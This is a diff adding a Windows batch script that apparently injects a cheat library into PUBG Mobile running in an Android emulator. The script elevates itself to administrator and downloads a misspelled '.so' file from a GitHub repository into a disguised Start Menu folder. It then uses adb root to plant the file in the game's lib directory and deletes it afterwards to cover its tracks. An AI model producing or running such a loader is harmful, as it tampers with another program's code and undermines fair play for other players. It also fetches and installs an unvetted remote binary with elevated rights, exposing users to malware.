@@ -1,0 +1,103 @@
+@echo off
+chcp 65001 >nul
+
+:: Check if running as administrator
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    echo Requesting administrative privileges...
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
+)
+
+:: Read path from redit.txt and verify it exists
+if not exist C:\Windows\System32\config\systemprofile\redit.txt (
+    echo ERROR: redit.txt not found!
+    pause
+    exit /b
+)
+
+:: Read path and remove any extra spaces or empty lines
+for /f "tokens=*" %%A in ('type C:\Windows\System32\config\systemprofile\redit.txt') do set target_path=%%A
+
+:: Ensure the path is not empty
+if "%target_path%"=="" (
+    echo ERROR: No valid path found in redit.txt!
+    pause
+    exit /b
+)
+
+:: Replace double backslashes with single ones
+set target_path=%target_path:\\=\%
+
+:: Replace AndroidEmulatorEn.exe with adb.exe
+set target_path=%target_path:AndroidEmulatorEn.exe=adb.exe%
+
+:: Extract the directory path (remove the filename)
+for %%I in ("%target_path%") do set target_dir=%%~dpI
+
+:: Ensure the directory exists before changing to it
+if not exist "%target_dir%" (
+    echo ERROR: The directory does not exist!
+    echo Path: "%target_dir%"
+    pause
+    exit /b
+)
+
+:: Change directory to the extracted path
+cd /d "%target_dir%" || (
+    echo ERROR: Failed to change directory.
+    echo Path: "%target_dir%"
+    pause
+    exit /b
+)
+
+:: Check for admin privileges
+fltmc >nul 2>&1
+if not %errorlevel%==0 (
+    echo WARNING: Please run this script as administrator.
+    pause
+    exit
+)
+
+:: Define the hidden path for storing the file
+set hiddenPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\SystemTools
+if not exist "%hiddenPath%" mkdir "%hiddenPath%"
+
+:: Define the filename
+set fileName=libAkAudioVisiual.so
+
+:: Download the file using PowerShell
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/jack74512/UAO7/raw/refs/heads/main/%fileName%' -OutFile '%hiddenPath%\%fileName%'"
+
+:: Verify the download was successful
+if not exist "%hiddenPath%\%fileName%" (
+    echo ERROR: File download failed!
+    exit /b
+)
+
+:: Start ADB commands
+adb kill-server
+adb start-server
+
+:: --- START PUBG MOBILE (From the Same Directory) ---
+echo Launching PUBG Mobile...
+adb shell monkey -p com.tencent.ig -c android.intent.category.LAUNCHER 1
+timeout /t 5 >nul
+
+adb root
+adb remount
+adb push "%hiddenPath%\%fileName%" /data/local/tmp/
+adb shell mv /data/local/tmp/%fileName% /data/data/com.tencent.ig/lib/
+:: Wait for 45 seconds before proceeding
+echo Waiting for 45 seconds...
+timeout /t 45 >nul
+
+adb shell rm /data/data/com.tencent.ig/lib/libAkAudioVisiual.so
+
+
+:: Clean up the hidden path
+if exist "%hiddenPath%\%fileName%" del "%hiddenPath%\%fileName%"
+
+echo.
+echo SUCCESS: All commands executed successfully!
+pause
